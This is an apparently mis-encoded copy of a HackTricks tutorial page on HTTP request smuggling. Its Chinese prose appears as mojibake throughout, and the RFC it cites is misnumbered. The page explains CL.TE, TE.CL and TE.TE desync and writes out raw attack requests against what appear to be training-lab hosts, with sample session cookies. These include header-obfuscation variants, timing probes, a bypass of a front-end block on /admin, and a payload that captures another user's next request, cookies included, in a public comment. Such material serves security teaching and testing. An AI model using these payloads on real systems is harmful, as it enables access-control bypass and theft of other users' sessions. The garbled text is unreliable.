# HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡» / HTTP Desync æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
- é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä»€ä¹ˆæ˜¯

å½“**å‰ç«¯ä»£ç†**å’Œ**åç«¯**æœåŠ¡å™¨ä¹‹é—´å‘ç”Ÿ**ä¸åŒæ­¥**æ—¶ï¼Œä¼šå‡ºç°æ­¤æ¼æ´ï¼Œä½¿å¾—**æ”»å‡»è€…**èƒ½å¤Ÿå‘é€ä¸€ä¸ª HTTP **è¯·æ±‚**ï¼Œåœ¨**å‰ç«¯**ä»£ç†ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰ä¸­è¢«**è§£é‡Š**ä¸º**å•ä¸ªè¯·æ±‚**ï¼Œè€Œåœ¨**åç«¯**æœåŠ¡å™¨ä¸­è¢«è§£é‡Šä¸º**2ä¸ªè¯·æ±‚**ã€‚\
è¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿåœ¨**åç«¯æœåŠ¡å™¨æ¥æ”¶åˆ°çš„ä¸‹ä¸€ä¸ªè¯·æ±‚**ä¹‹åä¿®æ”¹è¯¥è¯·æ±‚ã€‚

### ç†è®º

[**RFC è§„èŒƒï¼ˆ2161ï¼‰**](https://tools.ietf.org/html/rfc2616)

> å¦‚æœæ¥æ”¶åˆ°åŒæ—¶å…·æœ‰ä¼ è¾“ç¼–ç å¤´å­—æ®µå’Œå†…å®¹é•¿åº¦å¤´å­—æ®µçš„æ¶ˆæ¯ï¼Œåˆ™å¿…é¡»å¿½ç•¥åè€…ã€‚

**Content-Length**

> Content-Length å®ä½“å¤´æŒ‡ç¤ºå‘é€ç»™æ¥æ”¶æ–¹çš„å®ä½“ä¸»ä½“çš„å­—èŠ‚æ•°ã€‚

**Transfer-Encoding: chunked**

> Transfer-Encoding å¤´æŒ‡å®šç”¨äºå®‰å…¨ä¼ è¾“æœ‰æ•ˆè½½è·ä¸»ä½“çš„ç¼–ç å½¢å¼ã€‚\
> Chunked æ„å‘³ç€å¤§æ•°æ®ä»¥ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€

### ç°å®æƒ…å†µ

**å‰ç«¯**ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰**å¤„ç†** _**content-length**_ æˆ– _**transfer-encoding**_ å¤´ï¼Œè€Œ**åç«¯**æœåŠ¡å™¨**å¤„ç†å¦ä¸€ä¸ª**å¤´ï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„**ä¸åŒæ­¥**ã€‚\
è¿™å¯èƒ½éå¸¸å±é™©ï¼Œå› ä¸º**æ”»å‡»è€…å°†èƒ½å¤Ÿå‘åå‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚**ï¼Œè¯¥è¯·æ±‚å°†è¢«**åç«¯**æœåŠ¡å™¨**è§£é‡Šä¸º2ä¸ªä¸åŒçš„è¯·æ±‚**ã€‚è¿™ç§æŠ€æœ¯çš„å±é™©åœ¨äº**åç«¯**æœåŠ¡å™¨å°†**è§£é‡Š****æ³¨å…¥çš„ç¬¬äºŒä¸ªè¯·æ±‚**ï¼Œå°±å¥½åƒå®ƒ**æ¥è‡ªä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯**ï¼Œè€Œè¯¥å®¢æˆ·ç«¯çš„**çœŸå®è¯·æ±‚**å°†æˆä¸º**æ³¨å…¥è¯·æ±‚**çš„ä¸€éƒ¨åˆ†ã€‚

### ç‰¹æ®Šæƒ…å†µ

è¯·è®°ä½ï¼Œåœ¨ HTTP ä¸­ï¼Œ**æ¢è¡Œç¬¦ç”± 2 ä¸ªå­—èŠ‚ç»„æˆ**ï¼š

- **Content-Length**ï¼šæ­¤å¤´ä½¿ç”¨**åè¿›åˆ¶æ•°**æŒ‡ç¤ºè¯·æ±‚ä¸»ä½“çš„**å­—èŠ‚æ•°**ã€‚é¢„æœŸè¯·æ±‚ä¸»ä½“åœ¨æœ€åä¸€ä¸ªå­—ç¬¦ç»“æŸï¼Œ**åœ¨è¯·æ±‚æœ«å°¾ä¸éœ€è¦æ¢è¡Œç¬¦**ã€‚
- **Transfer-Encoding**ï¼šæ­¤å¤´åœ¨**ä¸»ä½“**ä¸­ä½¿ç”¨**åå…­è¿›åˆ¶æ•°**æŒ‡ç¤º**ä¸‹ä¸€ä¸ªå—**çš„**å­—èŠ‚æ•°**ã€‚**å—**å¿…é¡»ä»¥**æ¢è¡Œç¬¦ç»“æŸ**ï¼Œä½†æ­¤æ¢è¡Œç¬¦**ä¸è®¡å…¥**é•¿åº¦æŒ‡ç¤ºç¬¦ã€‚æ­¤ä¼ è¾“æ–¹æ³•å¿…é¡»ä»¥**å¤§å°ä¸º 0 çš„å—åè·Ÿ 2 ä¸ªæ¢è¡Œç¬¦**ç»“æŸï¼š`0`
- **Connection**ï¼šæ ¹æ®æˆ‘çš„ç»éªŒï¼Œå»ºè®®åœ¨è¯·æ±‚ä¸²è¡Œçš„ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­ä½¿ç”¨**`Connection: keep-alive`**ã€‚

## åŸºæœ¬ç¤ºä¾‹

å› æ­¤ï¼Œè¯·æ±‚ä¸²è¡Œæ”»å‡»æ¶‰åŠå°†`Content-Length`å¤´å’Œ`Transfer-Encoding`å¤´æ”¾å…¥å•ä¸ª HTTP è¯·æ±‚ä¸­ï¼Œå¹¶æ“çºµè¿™äº›å¤´ï¼Œä½¿å¾—å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¯¹è¯·æ±‚è¿›è¡Œä¸åŒå¤„ç†ã€‚å…·ä½“æ“ä½œæ–¹å¼å–å†³äºä¸¤ä¸ªæœåŠ¡å™¨çš„è¡Œä¸ºï¼š

- **CL.TE**ï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ã€‚
- **TE.CL**ï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ã€‚
- **TE.TE**ï¼šå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ`Transfer-Encoding`å¤´ï¼Œä½†å¯ä»¥é€šè¿‡æŸç§æ–¹å¼ä½¿å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚

### CL.TE æ¼æ´

åœ¨è¿™é‡Œï¼Œ**å‰ç«¯**æœåŠ¡å™¨ä½¿ç”¨**`Content-Length`**å¤´ï¼Œ**åç«¯**æœåŠ¡å™¨ä½¿ç”¨**`Transfer-Encoding`**å¤´ã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œç®€å•çš„ HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

è¯·æ³¨æ„ï¼Œ`Content-Length`æŒ‡ç¤º**è¯·æ±‚ä¸»ä½“é•¿åº¦ä¸º 30 å­—èŠ‚**ï¼ˆ_è¯·è®°ä½ HTTP ä½¿ç”¨æ¢è¡Œç¬¦ï¼Œæ¯ä¸ªæ¢è¡Œç¬¦å  2 ä¸ªå­—èŠ‚_ï¼‰ï¼Œå› æ­¤åå‘ä»£ç†**å°†å‘é€å®Œæ•´è¯·æ±‚**åˆ°åç«¯ï¼Œå¹¶ä¸”åç«¯å°†å¤„ç†`Transfer-Encoding`å¤´ï¼Œå°†`GET /404 HTTP/1.1`ç•™ä½œ**ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å¤´**ï¼ˆé¡ºä¾¿è¯´ä¸€å¥ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†é™„åŠ åˆ°`Foo:x<ä¸‹ä¸€ä¸ªè¯·æ±‚ä»è¿™é‡Œå¼€å§‹>`ï¼‰ã€‚

### TE.CL æ¼æ´

åœ¨è¿™é‡Œï¼Œå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œç®€å•çš„ HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**åå‘ä»£ç†**å°†**å‘é€æ•´ä¸ªè¯·æ±‚**åˆ°**åç«¯**ï¼Œå› ä¸º**`Transfer-encoding`**æŒ‡ç¤ºå¦‚æ­¤ã€‚ä½†æ˜¯ï¼Œ**åç«¯**å°†ä»…å¤„ç†**`7b`**ï¼ˆ4 å­—èŠ‚ï¼‰ï¼Œå¦‚`Content-Length`æ‰€ç¤ºã€‚å› æ­¤ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†æ˜¯ä»¥`GET /404 HTTP/1.1`å¼€å¤´çš„è¯·æ±‚ã€‚

_è¯·æ³¨æ„ï¼Œå³ä½¿æ”»å‡»å¿…é¡»ä»¥`0`ç»“å°¾ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚ä¹Ÿå°†é™„åŠ ä¸º**x**å‚æ•°çš„é¢å¤–å€¼ã€‚_\
_è¿˜è¯·æ³¨æ„ï¼ŒåµŒå…¥è¯·æ±‚çš„ Content-Length å°†æŒ‡ç¤ºå°†é™„åŠ åˆ°**x**å‚æ•°çš„ä¸‹ä¸€ä¸ªè¯·æ±‚çš„é•¿åº¦ã€‚å¦‚æœå¤ªå°ï¼Œå°†åªé™„åŠ å‡ ä¸ªå­—èŠ‚ï¼Œå¦‚æœå¤ªå¤§ï¼ˆå¤§äºä¸‹ä¸€ä¸ªè¯·æ±‚çš„é•¿åº¦ï¼‰ï¼Œå°†ä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚æŠ›å‡ºé”™è¯¯ã€‚_

### TE.TE æ¼æ´

åœ¨è¿™é‡Œï¼Œå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ`Transfer-Encoding`å¤´ï¼Œä½†å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨å¯ä»¥é€šè¿‡æŸç§æ–¹å¼è¯±ä½¿ä¸å¤„ç†å®ƒã€‚\
å¯ä»¥é€šè¿‡å„ç§æ–¹å¼æ··æ·†`Transfer-Encoding`å¤´ã€‚ä¾‹å¦‚ï¼š

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

æ ¹æ®**åœæ­¢å¤„ç†**TE å¤´çš„æœåŠ¡å™¨ï¼ˆåå‘ä»£ç†æˆ–åç«¯ï¼‰ï¼Œæ‚¨å°†æ‰¾åˆ°**CL.TE æ¼æ´**æˆ–**TE.CL æ¼æ´**ã€‚

## æŸ¥æ‰¾ HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡»

### ä½¿ç”¨å®šæ—¶æŠ€æœ¯æŸ¥æ‰¾ CL.TE æ¼æ´

å¦‚æœåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°è¯·æ±‚ä¸²è¡Œæ”»å‡»çš„ CL.TE å˜ä½“å½±å“ï¼Œåˆ™å‘é€ä»¥ä¸‹è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´æ—¶é—´å»¶è¿Ÿï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
ç”±äºå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ï¼Œå®ƒå°†ä»…è½¬å‘æ­¤è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œçœç•¥`0`ã€‚åç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ï¼Œå¤„ç†ç¬¬ä¸€ä¸ªå—ï¼Œç„¶åç­‰å¾…ä¸‹ä¸€ä¸ªå—åˆ°è¾¾ã€‚è¿™å°†å¯¼è‡´å¯è§‚å¯Ÿåˆ°çš„æ—¶é—´å»¶è¿Ÿã€‚

æœ‰æ—¶ï¼Œæ‚¨ä¸ä¼šæ”¶åˆ°è¶…æ—¶ï¼Œè€Œæ˜¯ä»æœ€ç»ˆä¸»æœºæ”¶åˆ°400é”™è¯¯è¯·æ±‚ï¼Œå°±åƒåœ¨ä»¥ä¸‹åœºæ™¯ä¸­å‘é€CL.TEæœ‰æ•ˆè´Ÿè½½æ—¶ä¸€æ ·ï¼š

![](<../../.gitbook/assets/image (444).png>)

å“åº”æ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œå…¶ä¸­åŒ…å«ä¸»ä½“å†…çš„é”™è¯¯ï¼Œç”šè‡³åŒ…æ‹¬ä½¿ç”¨çš„haproxyç‰ˆæœ¬ï¼š

![](<../../.gitbook/assets/image (443).png>)

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾TE.CLæ¼æ´

å¦‚æœåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°è¯·æ±‚èµ°ç§çš„TE.CLå˜ä½“çš„å½±å“ï¼Œé‚£ä¹ˆå‘é€ç±»ä¼¼ä»¥ä¸‹è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´æ—¶é—´å»¶è¿Ÿï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### æ¢æµ‹ HTTP è¯·æ±‚ä¸²è¡Œæ¼æ´

ä¸€æ—¦æ‚¨å‘ç°**æ—¶é—´æŠ€æœ¯æœ‰æ•ˆ**ï¼Œæ‚¨éœ€è¦**æ¢æµ‹**æ‚¨æ˜¯å¦å¯ä»¥**ç¯¡æ”¹å…¶ä»–å®¢æˆ·ç«¯è¯·æ±‚**ã€‚\
æœ€ç®€å•çš„æ–¹æ³•æ˜¯å°è¯•æ“çºµè‡ªå·±çš„è¯·æ±‚ï¼Œä¾‹å¦‚**è¯·æ±‚`/`è¿”å›404**ã€‚\
åœ¨[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ä¸­ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•ä½¿ç”¨`CL.TE`å’Œ`TE.CL`ç¤ºä¾‹æ¥æ“çºµå®¢æˆ·ç«¯è¯·æ±‚ä»¥è¯·æ±‚`/404`ï¼Œä»è€Œåœ¨å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½•å…¶ä»–èµ„æºæ—¶å¼•å‘404å“åº”ã€‚

**æ³¨æ„äº‹é¡¹**

åœ¨å°è¯•é€šè¿‡å¹²æ‰°å…¶ä»–è¯·æ±‚æ¥ç¡®è®¤è¯·æ±‚ä¸²è¡Œæ¼æ´æ—¶ï¼Œåº”ç‰¢è®°ä»¥ä¸‹é‡è¦è€ƒè™‘äº‹é¡¹ï¼š

* â€œæ”»å‡»â€è¯·æ±‚å’Œâ€œæ­£å¸¸â€è¯·æ±‚åº”é€šè¿‡ä¸åŒçš„ç½‘ç»œè¿æ¥å‘é€åˆ°æœåŠ¡å™¨ã€‚é€šè¿‡åŒä¸€è¿æ¥å‘é€ä¸¤ä¸ªè¯·æ±‚æ— æ³•è¯æ˜æ¼æ´å­˜åœ¨ã€‚
* â€œæ”»å‡»â€è¯·æ±‚å’Œâ€œæ­£å¸¸â€è¯·æ±‚åº”å°½å¯èƒ½ä½¿ç”¨ç›¸åŒçš„ URL å’Œå‚æ•°åç§°ã€‚è¿™æ˜¯å› ä¸ºè®¸å¤šç°ä»£åº”ç”¨ç¨‹åºæ ¹æ® URL å’Œå‚æ•°å°†å‰ç«¯è¯·æ±‚è·¯ç”±åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ã€‚ä½¿ç”¨ç›¸åŒçš„ URL å’Œå‚æ•°å¢åŠ äº†è¯·æ±‚å°†ç”±åŒä¸€åç«¯æœåŠ¡å™¨å¤„ç†çš„æœºä¼šï¼Œè¿™å¯¹æ”»å‡»è‡³å…³é‡è¦ã€‚
* åœ¨æµ‹è¯•â€œæ­£å¸¸â€è¯·æ±‚ä»¥æ£€æµ‹æ¥è‡ªâ€œæ”»å‡»â€è¯·æ±‚çš„ä»»ä½•å¹²æ‰°æ—¶ï¼Œæ‚¨å°†ä¸åº”ç”¨ç¨‹åºåŒæ—¶æ¥æ”¶çš„ä»»ä½•å…¶ä»–è¯·æ±‚ï¼ˆåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ï¼‰ç«äº‰ã€‚æ‚¨åº”è¯¥åœ¨â€œæ”»å‡»â€è¯·æ±‚ä¹‹åç«‹å³å‘é€â€œæ­£å¸¸â€è¯·æ±‚ã€‚å¦‚æœåº”ç”¨ç¨‹åºå¾ˆå¿™ï¼Œæ‚¨å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½ç¡®è®¤æ¼æ´ã€‚
* åœ¨æŸäº›åº”ç”¨ç¨‹åºä¸­ï¼Œå‰ç«¯æœåŠ¡å™¨å……å½“è´Ÿè½½å‡è¡¡å™¨ï¼Œå¹¶æ ¹æ®æŸäº›è´Ÿè½½å‡è¡¡ç®—æ³•å°†è¯·æ±‚è½¬å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿã€‚å¦‚æœæ‚¨çš„â€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚è¢«è½¬å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿï¼Œåˆ™æ”»å‡»å°†å¤±è´¥ã€‚è¿™æ˜¯æ‚¨å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½ç¡®è®¤æ¼æ´çš„å¦ä¸€ä¸ªåŸå› ã€‚
* å¦‚æœæ‚¨çš„æ”»å‡»æˆåŠŸå¹²æ‰°äº†åç»­è¯·æ±‚ï¼Œä½†è¿™ä¸æ˜¯æ‚¨å‘é€çš„â€œæ­£å¸¸â€è¯·æ±‚ä»¥æ£€æµ‹å¹²æ‰°çš„è¯·æ±‚ï¼Œåˆ™æ„å‘³ç€å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºç”¨æˆ·å—åˆ°äº†æ‚¨çš„æ”»å‡»å½±å“ã€‚å¦‚æœæ‚¨ç»§ç»­æ‰§è¡Œæµ‹è¯•ï¼Œè¿™å¯èƒ½ä¼šå¯¹å…¶ä»–ç”¨æˆ·äº§ç”Ÿç ´åæ€§å½±å“ï¼Œå› æ­¤æ‚¨åº”è¯¥è°¨æ…è¡Œäº‹ã€‚

### é€šè¿‡é€è·³å¤´å¼ºåˆ¶

æ»¥ç”¨é€è·³å¤´ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤ºä»£ç†**åˆ é™¤æ ‡å¤´ Content-Length æˆ– Transfer-Encoding ä»¥ä¾¿æ»¥ç”¨ HTTP è¯·æ±‚ä¸²è¡Œæ¼æ´**ã€‚
```
Connection: Content-Length
```
## æ»¥ç”¨HTTPè¯·æ±‚ä¸²è”

### ç”¨äºç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶

æœ‰æ—¶**å‰ç«¯ä»£ç†ä¼šæ‰§è¡Œä¸€äº›å®‰å…¨æ£€æŸ¥**ã€‚æ‚¨å¯ä»¥é€šè¿‡æ»¥ç”¨HTTPè¯·æ±‚ä¸²è”æ¥**ç»•è¿‡è¿™äº›ä¿æŠ¤æªæ–½**ã€‚ä¾‹å¦‚ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ‚¨**æ— æ³•ä»å¤–éƒ¨è®¿é—®`/admin`**ï¼Œè€Œå‰ç«¯ä»£ç†æ­£åœ¨æ£€æŸ¥ï¼Œä½†æ˜¯è¿™ä¸ª**ä»£ç†æ²¡æœ‰æ£€æŸ¥åµŒå…¥çš„è¯·æ±‚**ï¼š

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### æ­ç¤ºå‰ç«¯è¯·æ±‚é‡å†™ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

åœ¨è®¸å¤šåº”ç”¨ç¨‹åºä¸­ï¼Œ**å‰ç«¯æœåŠ¡å™¨åœ¨å°†è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ä¹‹å‰æ‰§è¡Œä¸€äº›è¯·æ±‚é‡å†™**ï¼Œé€šå¸¸æ˜¯é€šè¿‡æ·»åŠ ä¸€äº›é¢å¤–çš„è¯·æ±‚æ ‡å¤´ã€‚\
ä¸€ç§å¸¸è§çš„åšæ³•æ˜¯**åœ¨è¯·æ±‚ä¸­æ·»åŠ æ ‡å¤´** `X-Forwarded-For: <å®¢æˆ·ç«¯çš„IP>` æˆ–ç±»ä¼¼çš„æ ‡å¤´ï¼Œä»¥ä¾¿åç«¯çŸ¥é“å®¢æˆ·ç«¯çš„IPã€‚\
æœ‰æ—¶ï¼Œå¦‚æœæ‚¨èƒ½**æ‰¾åˆ°é™„åŠ åˆ°è¯·æ±‚çš„æ–°å€¼**ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿ**ç»•è¿‡ä¿æŠ¤æªæ–½**å¹¶**è®¿é—®éšè—çš„ä¿¡æ¯**/**ç«¯ç‚¹**ã€‚

è¦å‘ç°ä»£ç†å¦‚ä½•é‡å†™è¯·æ±‚ï¼Œæ‚¨éœ€è¦**æ‰¾åˆ°åç«¯å°†åæ˜ å…¶å€¼çš„POSTå‚æ•°**ã€‚ç„¶åï¼Œå°†æ­¤å‚æ•°æ”¾åœ¨æœ€åä¸€ä¸ªä½ç½®ï¼Œå¹¶ä½¿ç”¨ç±»ä¼¼äºä»¥ä¸‹ç¤ºä¾‹çš„åˆ©ç”¨ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†é™„åŠ åœ¨`search=`ä¹‹åï¼Œè¿™ä¹Ÿæ˜¯**å°†åœ¨å“åº”ä¸­åæ˜ å…¶å€¼çš„å‚æ•°**ï¼Œå› æ­¤å®ƒå°†**åæ˜ ä¸‹ä¸€ä¸ªè¯·æ±‚çš„æ ‡å¤´**ã€‚

è¯·æ³¨æ„ï¼Œ**ä»…ä¼šåæ˜ åµŒå…¥è¯·æ±‚çš„`Content-Length`æ ‡å¤´ä¸­æŒ‡ç¤ºçš„é•¿åº¦**ã€‚å¦‚æœä½¿ç”¨è¾ƒå°çš„æ•°å­—ï¼Œåªä¼šåæ˜ å°‘é‡å­—èŠ‚ï¼Œå¦‚æœä½¿ç”¨æ¯”æ‰€æœ‰æ ‡å¤´é•¿åº¦æ›´å¤§çš„æ•°å­—ï¼Œåˆ™åµŒå…¥è¯·æ±‚å°†å¼•å‘é”™è¯¯ã€‚å› æ­¤ï¼Œæ‚¨åº”è¯¥**ä»ä¸€ä¸ªå°æ•°å­—å¼€å§‹**ï¼Œç„¶å**é€æ¸å¢åŠ **ï¼Œç›´åˆ°çœ‹åˆ°æ‚¨æƒ³è¦çœ‹åˆ°çš„æ‰€æœ‰å†…å®¹ã€‚\
è¿˜è¦æ³¨æ„ï¼Œ**æ­¤æŠ€æœ¯ä¹Ÿå¯åˆ©ç”¨TE.CL**æ¼æ´ï¼Œä½†è¯·æ±‚å¿…é¡»ä»¥`search=\r\n0`ç»“å°¾ã€‚ä½†æ˜¯ï¼Œæ— è®ºæ–°è¡Œå­—ç¬¦å¦‚ä½•ï¼Œå€¼éƒ½å°†é™„åŠ åˆ°æœç´¢å‚æ•°ã€‚

æœ€åè¯·æ³¨æ„ï¼Œåœ¨æ­¤æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬ä»åœ¨æ”»å‡»è‡ªå·±ä»¥äº†è§£å‰ç«¯ä»£ç†å¦‚ä½•é‡å†™è¯·æ±‚ã€‚

### æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

å¦‚æœæ‚¨èƒ½æ‰¾åˆ°ä¸€ä¸ªå°†ä¿å­˜æŸä¸ªå‚æ•°å†…å®¹çš„POSTè¯·æ±‚ï¼Œæ‚¨å¯ä»¥å°†ä»¥ä¸‹è¯·æ±‚é™„åŠ ä¸ºè¯¥å‚æ•°çš„å€¼ï¼Œä»¥ä¾¿å­˜å‚¨ä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼š

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**å‚æ•°comment**çš„å€¼å°†è¢«**ä¿å­˜åœ¨é¡µé¢ä¸Šä¸€ä¸ªå…¬å¼€å¯è§çš„å¸–å­çš„è¯„è®º**ä¸­ï¼Œå› æ­¤å°†æ˜¾ç¤ºä¸€ä¸ªå¸¦æœ‰ä¸‹ä¸€ä¸ªè¯·æ±‚å†…å®¹çš„è¯„è®ºã€‚

